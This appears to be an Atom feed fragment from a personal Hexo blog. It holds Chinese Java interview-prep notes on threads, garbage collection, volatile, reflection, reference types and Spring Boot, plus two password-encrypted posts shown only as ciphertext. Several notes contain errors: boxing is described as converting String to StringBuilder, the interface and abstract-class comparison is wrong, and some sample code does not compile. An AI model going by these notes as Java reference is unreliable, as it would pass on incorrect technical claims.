    <content type="html"><![CDATA[<h1 id="jvav"><a href="#jvav" class="headerlink" title="jvav"></a>jvav</h1><p>栈: </p><p>要知道用什么数据结构来做</p><h1 id="优先级不高"><a href="#优先级不高" class="headerlink" title="优先级不高"></a>优先级不高</h1><p>int、Integer</p><h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><p>合并两个有序链表: 从尾部开始考虑，直到头部<br>将两个升序链表合并为一个新的升序链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> ListNode <span class="hljs-title function_">mergeTwoLists</span><span class="hljs-params">(ListNode l1, ListNode l2)</span> &#123;<br>        <span class="hljs-keyword">if</span> (l1 == <span class="hljs-literal">null</span>) &#123;<span class="hljs-keyword">return</span> l2;&#125; <br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (l2 == <span class="hljs-literal">null</span>) &#123;<span class="hljs-keyword">return</span> l1;&#125; <br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (l1.val &lt; l2.val) &#123;<br>            l1.next = mergeTwoLists(l1.next, l2);<br>            <span class="hljs-keyword">return</span> l1;<br>        &#125; <br>        <span class="hljs-keyword">else</span> &#123;<br>            l2.next = mergeTwoLists(l1, l2.next);<br>            <span class="hljs-keyword">return</span> l2;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Stack类型问题：Java中的Stack类只能接受引用类型作为泛型参数，不能直接使用基本数据类型。因此，你不能使用Stack<char>，而应该使用Stack<Character>。</p><h1 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h1><p>性质：二叉搜索树的中序遍历一定是递增的</p><h1 id="动态规划："><a href="#动态规划：" class="headerlink" title="动态规划："></a>动态规划：</h1><p>给定三个字符串 s1、s2、s3，请你帮忙验证 s3 是否是由 s1 和 s2 交错 组成的。<br>最优子结构：a[i]&#x3D;a[i-1]+b[i…]…balabala</p><h2 id="滚动数组"><a href="#滚动数组" class="headerlink" title="滚动数组"></a>滚动数组</h2><h1 id="lang"><a href="#lang" class="headerlink" title="lang"></a>lang</h1><p>Scanner s&#x3D; new Scanner…</p><h1 id="笔经"><a href="#笔经" class="headerlink" title="笔经"></a>笔经</h1><p><del>线程、进程区别</del></p><p>页面间参数传递的方法有哪些：GET\POST、cookie、Session</p><p>什么是依赖注入(DI)、控制反转(IoC)？背–DI: 组件不由自己来创建、管理对象，而由外部容器负责，然后注入到组件中。–IoC: 控制权从程序代码转移到容器。  –why: 减少耦合度</p><p>接口、抽象类区别：抽象类可以被继承，接口不能；接口可以多重继承、抽象类不能。抽象类适用表示一种类，接口则是规范</p><p>线程如何共享数据：<br>Forword和Redirect区别：</p><p>servlet: </p><p>如何唤醒阻塞</p><h2 id="jvav-1"><a href="#jvav-1" class="headerlink" title="jvav"></a>jvav</h2><p>java里ArrayList和LinkedList：动态数组和链表<br>final的3个作用</p><h2 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h2><p>Spring Boot中的Profile是如何工作的？ – Profile提供了一种方式，通过@Profile注解，可以指定某个组件在特定的Profile激活时才加载。</p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL:"></a>SQL:</h2><p>like+%:<br>limit+offset<br>order+desc</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jvav面筋</title>
    <link href="/2023/04/17/java/"/>
    <url>/2023/04/17/java/</url>
    
    <content type="html"><![CDATA[<h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><h2 id="实现线程的方式"><a href="#实现线程的方式" class="headerlink" title="实现线程的方式"></a>实现线程的方式</h2><p>1、编写类直接继承 java.lang.Thread</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 编写程序，这段程序运行在分支线程中（分支栈）。</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;分支线程---&gt;&quot;</span> + i);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadTest02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>();<br>        t.run(); <span class="hljs-comment">// 不会启动线程，不会分配新的分支栈(这种方式就是单线程，只顺序不并发)</span><br>        t.start();<span class="hljs-comment">// 这里的代码还是运行在主线程中</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;主线程---&gt;&quot;</span> + i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>扫盲: 调用 start() 方法的效果是启动一个新的线程，并且让这个线程开始执行 run() 方法中的代码，此时主线程仍继续执行自己的代码，即并发<br>2、编写类，实现java.lang.Runnable 接口，实现run方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 这不是一个线程类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRunnable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;分支线程---&gt;&quot;</span> + i);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadTest03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyRunnable</span>()); <br>        <span class="hljs-comment">// 启动线程</span><br>        t.start();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;主线程---&gt;&quot;</span> + i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>result:(独立运行)</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">主线程<span class="hljs-params">---</span>&gt;0<br>分支线程<span class="hljs-params">---</span>&gt;0<br>主线程<span class="hljs-params">---</span>&gt;1<br>主线程<span class="hljs-params">---</span>&gt;2<br>主线程<span class="hljs-params">---</span>&gt;3<br><span class="hljs-string">......</span><br>主线程<span class="hljs-params">---</span>&gt;17<br>分支线程<span class="hljs-params">---</span>&gt;1<br><span class="hljs-string">......</span><br>分支线程<span class="hljs-params">---</span>&gt;25<br><span class="hljs-string">......</span><br>主线程<span class="hljs-params">---</span>&gt;99<br></code></pre></td></tr></table></figure><h2 id="线程的方法"><a href="#线程的方法" class="headerlink" title="线程的方法"></a>线程的方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">r.run = <span class="hljs-literal">false</span>;<span class="hljs-comment">//终止线程</span><br>...略<br></code></pre></td></tr></table></figure><h2 id="垃圾回收机制"><a href="#垃圾回收机制" class="headerlink" title="垃圾回收机制"></a>垃圾回收机制</h2><p>必考<br>可达、不可达、彻底不可达</p><h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><p>线程同步机制：就是线程排队，必须排队<br>synchronized关键字: </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increaseCounter</span><span class="hljs-params">()</span> &#123;....&#125;;<span class="hljs-comment">// 使用 synchronized确保只有一个线程可以同时访问该方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        Thread t1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>())&#123;<br>            <span class="hljs-meta">@Override</span>;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>                increaseCounter();<br>            &#125;<br>        &#125;<br>        Thread t2...;<br>        t1.start();<br>        t2.start();<br>        ......<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h2><p>比synchronized更轻量级的控制线程同步机制<br>spring-boot-starter-parentxuexi1</p><h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><h2 id="throws和throw"><a href="#throws和throw" class="headerlink" title="throws和throw"></a>throws和throw</h2><h2 id="J2EE"><a href="#J2EE" class="headerlink" title="J2EE"></a>J2EE</h2><h2 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h2><p>分为编译阶段和运行阶段，运行阶段是把编译后的文件放入内存，Class对象的由来是将.class文件读入内存，并为之创建一个Class对象。</p><p>反射调用方法时可以忽略权限检查，获取这个类的私有方法和属性，因此可能会破坏类的封装性而导致安全问题。如果不需要动态地创建一个对象，那么就不需要用反射<br>Java 反射机制在一般的 Java 应用开发中很少使用，即便是 Java EE 阶段也很少使用。</p><h2 id="静态方法和实例方法区别"><a href="#静态方法和实例方法区别" class="headerlink" title="静态方法和实例方法区别"></a>静态方法和实例方法区别</h2><p>静态方法无需实例化对象，只能访问静态变量</p><h2 id="自动装箱、自动拆箱"><a href="#自动装箱、自动拆箱" class="headerlink" title="自动装箱、自动拆箱"></a>自动装箱、自动拆箱</h2><p>装箱: 将String、Int转化为StringBulider、Integer等</p><h2 id="volatile、synchronized"><a href="#volatile、synchronized" class="headerlink" title="volatile、synchronized"></a>volatile、synchronized</h2><p>volatile 关键字保证了多线程之间对变量的修改是可见的。当一个线程修改了 volatile 变量的值，其他线程能够立即看到这个修改。这意味着当一个线程修改了 flag 的值，其他线程在读取 flag 时能够立即看到最新的值。</p><h2 id="四大引用（强软弱虚）"><a href="#四大引用（强软弱虚）" class="headerlink" title="四大引用（强软弱虚）"></a>四大引用（强软弱虚）</h2><p>强引用：是最常见的引用类型。当一个对象被强引用关联时，即使内存空间不足时，Java 的垃圾回收器也不会回收这个对象。只有当该对象不再被任何强引用关联时，垃圾回收器才会回收该对象。<br>软引用：软引用被用来描述一些还有用但非必需的对象。在系统将要发生内存溢出异常之前，将会把这些对象列进回收范围之中进行第二次回收。如果这次回收后还没有足够的内存，才会抛出内存溢出异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SoftReference&lt;Object&gt; softRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoftReference</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());<span class="hljs-comment">//SoftReference: 软引用类</span><br></code></pre></td></tr></table></figure><p>弱引用：弱引用与软引用的区别在于，当垃圾回收器开始工作，无论当前内存是否足够，都会回收被弱引用关联的对象。这样的对象的生命周期会比较短暂，常常被用于构建对象缓存、线程池等。<br>虚引用：虚引用是最弱的一种引用类型，几乎没有实际意义。</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022</title>
    <link href="/2023/01/20/2022-summary/"/>
    <url>/2023/01/20/2022-summary/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6ff7038889f454dcb88fa4b2b4419d7fa7816934d6be9aa757adbb6bcbd661a8">e4bd6587f5b022b7ffbfbb7e009dbc16f3e78710ba1bef800917f430c3ace07aa3141208d3145fc1be8dba6e22ad502159a5d635414c0412e71b95994f0e73f1b8ac0dba0ce1b6782f26d20fea5d0bca6bb29d8309a9b5acdcf6ab71770aa7f31f69717e7d0b0606dc5f1757c1e4e1f959c1e9d92741eaeb8462b8df9e2f51955f693fc9612282bf4352ffd8e18a21165fb106fa0dab091e3f9d1bd54a23c6adb5c6d97c62a2efe31c2bf19d5bbff9303dc69b7983696035adb30132c83e7181cd60410ce76bc2c2837bbe7b37123f78d8ea05ad494030018ec1628723e7bacce1dc61937ecf8f161e417162dc647aafb93ae3c95e632ee421d11aa236af4f64bf42d95837f947623e88c918171fdd16248520754824eab9d46837a2dd701aec64425f57fe1c4a7df24a3977de9bc771c90e4728a1e7e1302d371f6b8fbd341c29400b671a2cb2bb2f9f43496425f64a265abcd1280d2de99348fcc1a9fa118f7bacd90c1aea01336041c088c9075ffe7aa5f96ed395b4974188319fe64021c549c1d692f2a2ca0562a2df8c2b66b1a87f7490d9f9fd42c0bd3d6af6689c6ee77baa0c22bf893665339969ccb6c4bd0911a27bb27bd613cb4948ed99ddfca039e837cc3792a507c67f9055325b15c43eef82d315be68cd8abcf3afc5a2eee35bccb60c426577b58c3a68bb7ed8a3221c5ec19465e6cd1404cab51945dcf66004e9aa748dd2fc72771200ade9fe0d295bde107fd1ad132de7427fc78dc62fc3fda1d25a797aa1c01ffa31282cef00b4dbb5a79afc5d1002d29c0d58338d256534c0ffdd73869a69579b6ed59c26eab290f80e11404dd811e145a79d5207bdddd996fb292a12158dd0499f43b965b76b4670a23c47efd873e2f945f765f016c4a78e14fb602afe2b739f1977f7dd16d5db78e82d6c3fd033fab63058c10d9b3b9b5d4bc5586f28836b549dfce8e0851933b37cc701463b812e2c80d145cf0b3acc29294013643c2aa1402c194a0572d485c2af97c202e4f3400ea22c839995789196b05e2d52e946fa9d6b263939460721c45b7ee6e030f6487f4dbd9e32e633f15be35e2a697c2321cb6d0053d4b0f90b0a10a2571c2718a06fd0910c25a95d45875fdb92bf2c0cb286ad7332d0881876679b867e5861de87502c12cd18d06d3e05fb29339438c708a79b878cbedcf6ea4a09fda35300f750feaf63ad435cadeb4676674ed25e947205dc7a29da8bf7ce6b5f6f9e05eee6f07e8a136b3d7cf485058265404d9757b998b4b54ceca77fd1c8aa6bcc0bf01dff9aea8533c9c07689e70ffb9d08be48955c648020a1c90fcb242d57426705049ade1dfda8e02e492d7b69b5b48828f8bad348aac2718d1721da6a7ae158ca96feb56d288f3d4a9955cf83959a6ac52ba19a931596a3946fd41774d8274536fe64228f1cd9b6e23d682b7db0ed34486b626482d919a6a8fe9cd921e368681b88c74ceec642a45d5e9896a616d0da62ef66fd6036e41b2473d9bd360b38b2a17982f37f6404baa4e523de22a81bdfa1c11a003ae12d5a16495ad68e40aff4bdf34f7be16cc7466b1e34e1f6741ab37afc61b47615641db6464083c62a33a39d0fee3bafed4bcdaf15f831b84c4e03d05e85d60318d359c9ba1efe56d64d741eeb8a78ecefa540070c261981702856fbb633059a50e4932101ec01ca53a48e50501e82af9d852189f1d6746a8a44c96681c627c69979f269c413cc1ee1c9ef4c14539013f97cc71baf6ddfeaff7fbcb0ac48a0a6e19bbef2f2c3bdf9392dff445459e6a26e04ce4c0134b290a0ab933522f44718fde8001296e6f0e519a1a1b6dafaaf53106e3a7bd9f66e0f1566d7edbb215edd7ea1a229b16f68e6ddaf4ce27a512eeded2d694b0e663d012fa669128348a76b1208792aad7fe3d6ef0c776ed7bc773d7175e5492b501e826276d07339b8b87e94b93a15495314274a55c155285773569ddcb4901205b8151102b37c419b03b9b43eac4f722496146b8df1529e30b29fa7b7662d9276d9f244601516ae221a090cd398dc0351f0d46bfb9961e24a94d5b25450d87d6abd6f33268d389b8368edbafa38c4fbc584233aa16d8443d6515b047bdeb34c2ad71a49bfad7cb19ac67a66dae4b99acbe3a430a5888c6f18d6627dc29e9efd0828f2a0d7555ca27dfd6ab15707e23f8496171e7d1be0723f2f0cdae82a26640793f332ddf6b28bada93a1693580a28829337558a3f7cc1ca91f71b1ced6b10f4481470082e80e13fafb97ac67abee171f543e7d4bf9c243cfc16b9fb99dee6f845a5aa497e1ef581193f738e7ab3569d775d7e5e0c4ce0dea74d7490d52d651a1b5021d4fbed48577afa2edfa85a65e3f337acfc3f714075d2b373039dff7ee8cb005c6915b32b430d26fb881f0d6da42c3f0e9cf37fb28e431baa6354ad1fbb849769732526b1dfd9341427fa73af4e33c1da083fd303cffd490767360f61805ed74b44ad56e717ba3c32311b321cc26d6d6ce40b40dc6e73bba8ae1c155aea2c2117093f87e92664e65d660fae436c6165ddc96790c2c6a3570c258a944a463a28f589d31e58eb258698cfefdf0e336f6848f6ba4d535e0a70afe0564bf0fc04a4b87b8c0afc2bcb1747a4b339ab699b7f67d15673b64d43ba0190d7c07ddda68385347541ba529f5414461b7fbba9b433f88712cecfb7a374621c118153c35b4a82465d4306c60b38d4c9b4db404a3df3e9bfedb48c28964fac374c4e5be2d551f7b48e794f7750ecd2d6c3b0085caa9367aef048f8e10aa883fb7e1874318907748a1186cbcf8220930efde9cf9b64546d0832ab03183dd040a0387551f004fdf8f786cf0e145240ca6334e17468ed5fa27f0bc9748e7f1cc4abda54469b9e4792eef933fbc48b7e8a42c3c8ff96f27f289cbde9ca72399ac76f21f829789cd0befb0d8a111196f3e5868f027bed325f09526570d817e04b68338301b8df9e246a3605b9d47fafbb34d8809251211f91215a198edf19abd9e0452c7c2283e87d1406d30d6857831924a8fed1f4e263502d4fc31f76e7dca0f0082b0453592fd1f1177a5e04539265f90475c98db9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">为菈妮，我变成狼人模样</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot笔记(损版)</title>
    <link href="/2022/09/09/SpringBoot%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/09/09/SpringBoot%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c231c16e9cfff5e7014c4c3d8bff45fe629c1fabd216e55abcbad7275eda7caf">73c76e0a353aeccb70d0acb36262e27e1d35e3b97c89119c2c9fee276c79702cc9a23d877bc3446d1897761e82464894dd25ebc4a9db5883ad32d4ea7ea72acbbad97060f3f9af53a67c2ac4f2d0ed156974555defe352838141e2a276995392cfedbae959e10cfc5df4a8b645c5e285e6b7af79057f0cba7c663b0034329919f51f25f0b1ebc9cd2e5c0a10219770e9edaa796d7309c1e066321d64a670befadc74d1256a53dffd375955b68c3a111cf687889febd04edb3864cce1d6544b325503a464612e3f518070c007df4f7e950e842233e34ac282389e327c5faa71c8c57e3632d7e8bcae764ddc3727377759b12fd4565ab4fbc35f8211a6e7c59bb9772d9198ea86f362fc137eaa4feafa44c3e6d4fc8c568a26910dd7d9916b2d062ca6372d4f163ebf4948890d2cf98258646b6ce077c3f7d47ac6a55f516bceea369753f737b6348cd5ebc0f797b9441d5b5de726ba5c02f8b91c971c2561a1ea547ff995257a96ae4df31c478a40c0456d482836f36cb327cf6ef21f78ae8ddb7054ebbb2b3ecb2e56d01117b3e42f075b1a94760c4986599e6178adf7694632cc45314a4d9ef9d736121e2f054fa20fcdfabd7c32910f9e17104bf67043d2db97a5510e11ba82aa67233f35c40d1abd769ac3be286c6e9f21dc4886ffec41b93c95364659af4c75e2d4ec161c84c91590dcda081346be38d17edf06025918b44ee7121f7a2e03f39b34d7e51093852ff33d2e1a281d977b4c1f88146f6fdec399552ce053ae430b432399aa45dcdebe319978ea5ac313556208f0b288ff81a963e4f30260c5bbd9ab0fb2264e987fab64d6bb6b58463e93d85c082fdcd40928ca2f05e865a755999d4e0a616ed6f520c10d290de040aea262651247c4b2f257e6b033edb319aa296745d797e9cf0c346f894f883db4e517a2927cd65bcc7a00f879944651ed39035a29350f711cdb8f82b4e7c44963424497a151f2f8cde4812d7385e17fbd3c45e2c68b78bd8189a5c1f04ab4eaa1d00434b8dda47527fe814a90b1b8e8f2d45b537097519805525b156a91041d96f5baf7fb07ec47ee4cda86e80313c8ea90e0750a4c0e871016e32b037cda1cd5d894535309232b80e20274b10178a6f59937557bf4f42e15e08fbeca7ec0de10c40513961fa2e6cd030d82d6e839cbc1f5137e6337048145221f9cc7ea0e21762ec0c009c2a8060be5ac02b04d606d3dbe083e07724ba3aa85ef65ccd9f6cb3fc44796cf77d070e1d321ac06c4f567294d5845f3f32741034868af180733fa14323e926a8d23253d6ab5767663e021184c9483bfb43b0423b23ff7f859b0919c346e7a7d8f5ec5750f104053682b57068deff94915ae9864a3863c2cb9da8dd5723a26129897f261203cadc88d04dc1aa4c6804dc6a67e78f0d574316ce01e2b6be5bd9548a6af10957fb952f875e0b8bd08df3232b4cf2c226c62b6b80be8395e4a69b8123df113273dbcfb41bee46ddc6e41a9286a91f8a091dfa486c8c27df84d0a6724788e0308a532829639f568f2603c27e9dc6d4fa695dcf5c8d5b0a099c922436f53bd71a0830249e03992d2fe78d71eb216980efcfd7ef31785193f61742337b20820fb17dde09fbc7205e37ecccb92d82314877d9e39ad8971593045045cde9f52c2a344bc74d63c0bea18eb2c7eca326a413bc8a90614fa1f9fed4c62b810b10dc1397b1ce88bd540f4556bef7c470a537aeb2769c8441ead558ca844ca0059bb32fddab43b6b9e865517bdb0e4076aae529437adf6e8432857c9f5078f01c5a8f47efd456635728640fa512a2dd883b04bcde78259b8e7adaa334de28e4f7b36d929f8935d164e9bfa8734565749c6b71ffa7a15da7fef455f784026593a08a4223186ead8592605327a76fbf75491f1a40d26ebee327b79086986f829c50a8100b78c6a7e5233e04e932bb8ac171297fcdb885e0ce7f767743e5c2f856068e39e3600c1717248fcd298b9bd253a5f3194aa116b0218c719e97d7581ec115a811772a510c4547be1e833470a7b545c60f070cac8b4337de1456a7b4ea0d3d749c7dedece309a1c863b7f29a06949876c6958628894351be1b2035cb743ca51e13ba924b8f0b2835790bae8868e0bb6f8cae721fee9ecbc45904c704a87d32c4d6881cc15c821197a15c053933f3b79ba48874abe638168444856f8b1138e75a8264a09b32c9d12c999a4c7d60a33579d93703238992e4d7943c78b1e3bc052f75deceffccbece5f10ae9cf6ed645ff9536819513c1a991759eeaa14c4eed2083ec83f084fac003b4f443aac688d3463c17bea89283ab1a8d3f65bab9694eca290a780fe24d1a4ea68c8d57a4a8ee3538588ef9af6ce91c0fd72c0a78b6f257f9f06a2451ed0cf89096ac97c50cfa0c3a0ea537c1d628c2dc4d25ead2be42661e0cac551e1a4ce1ee0a168058706b033b97b446739429d848609686280c0b1966285301c27a03094e6dbed3f3f6cff410afb0455606794016a40af37d5e8537269106e0b85ecf142020ac370dc5f093c9abf7151e2b4e2bfe61202dddf1e4bb168a234f8d279b34313dbddb9f9eeb124a232a261761c54d712f654f9a07e324f51f3f46fc97d7c903e08c90d1ee51b9cde98d8bbad94ef86443b538f022ce5b62779b07bfecc6907c7478a20d43f7c59568cf912c73975a478e7f59cb4f944392a29e784ddf050ce94adc17bbb052fbc1e6d29160ad7d5c072bc27341b533626e956dd1a034d1eef86955c37ecdc1ced759069906d2c43e59e3ae3ebf8b871bf1642da6bc61abfc273981db7390d2cb529a98da8c7cacf0f410d33b84c03cf30513e7608ac85fb5ab81121e02ebc229365388d6fde1af829548701bfe764d0f4bc9082c3a544e4e131bd8043543f15f322db52dcdf53fe81f4e8bb7da9ab92a66db701c5fe0800f3cc27a66c0639242262c7d829415ebed50379eff9920159e396e78f51b3f8636dbbc3744fbccfd109499f839db339e73b5b81d17d97de2c370ba3dfc572b538a599df6747dd5de3a34995b42dc30837132cb7218ee43a16464d2cae62f855bc6f56f54671897df6633dac6072de54472b408b2641012b5f615dbd919a76d8857465ac4a3de198219b34666d9089e20799c909394223783004ffc88867ab92200d6e1a7bc95e41d9b7ef18167a9684ba5adb1320460c338644f9db5c3af2c3a090da15a949ff2075b5b5a3938a6970ff5d1810f1bf413a2431da82f6d4afdb653ae186df74fa0d9e7a11cceee5a4ddd4b4a419195d2b19294d3f0ddf8f1bf1b6ad0ffd86ed1f8aba4deaa8fd8a97949cae5731b8a04bfa2d4e12f3da1f02589bf80b320be950f333be2fc751d253acb88b9255efcd4e7a937aa51e563edab7a18a4c54c3b7230d5e2c756ef0ef5dd5234efcbba33fbb3666e3ba8aebf8018759004ab2d3926532e69963fc235967417c7dd371ac2ae8bcdef732058301c1f89c698676a2dff08415c8d8be71ebeff9d037d408ab157fca35011cf3c53ac0e2cd3085fda9721cdd920cc7dea36a9b6e3a4ce7234e3f92c4a41ea7e30602092bba61efe7d316723738caf522559b31812fea20ca03af30c23fab00837dc82bd4cfe677f21b557238b9329f762830bbd657b1215d3dfba39751938af3fe24386391303775d1bcff35e06a0db76823608d9e6fdd8184b45fea2df17dd7ab1aee388c8b0a07ccdf8ca74491f1f869ec1cea18d06b98963250f2452b69e066598c0a4e8aa8288b134affd20c52669f0ffc1c3ba71cc8b39a247a9f45a82d434c79503ffcdcf5e4b6fd20b95600a87524ca11e0179356d58eeebff72a15591acc93639df283b4b15e55831a0fe22bef34379878b46496a7a9a613342940a91726492a87b5858833181def2c93237770a25b7ff87d37dd36432c597c078659b9302a30451690e25259d5d3e4fa3263f75a70927f38cb078e0cd60e75db0753747ce0c94083e0b492ce3ae30606389c62996532d50ce19b6ede663ed9ac02af55ec48b50da50a4dff5ce029f856d21a